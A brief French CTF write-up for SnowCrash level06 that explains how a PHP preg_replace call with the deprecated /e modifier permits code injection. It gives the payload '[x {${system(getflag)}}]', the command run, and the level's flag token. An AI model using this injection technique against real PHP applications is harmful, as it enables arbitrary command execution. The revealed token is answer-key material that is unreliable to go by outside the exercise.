# Level06 - PHP Regexp
Pour résoudre le level06, on a un fichier level06, qui exécute avec les droits de `flag06` le fichier level06.php. On regarde le code source et on remarque l'utilisation de nombreuses regexp. Le programme récupère le contenu du fichier qu'on lui passe en paramètres et lui applique une série de regexp. L'une d'entre elle est étrange, on utilise un modifier deprecated, le `/e`, qui va exécuter l'expression envoyée à la regexp. 

```
$a = preg_replace("/(\[x (.*)\])/e"
```

On peut ainsi injecter du code PHP à l'intérieur et il sera exécuté. Le code devra être formaté ainsi pour que la regexp puisse l'évaluer:

```
[x {${system(getflag)}}]
```
On met ce code dans un fichier dans `/tmp` et on lance `level06` dessus:

```
level06@SnowCrash:~$ ./level06 /tmp/toto
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

On a notre token: `wiok45aaoguiboiki2tuin6ub`

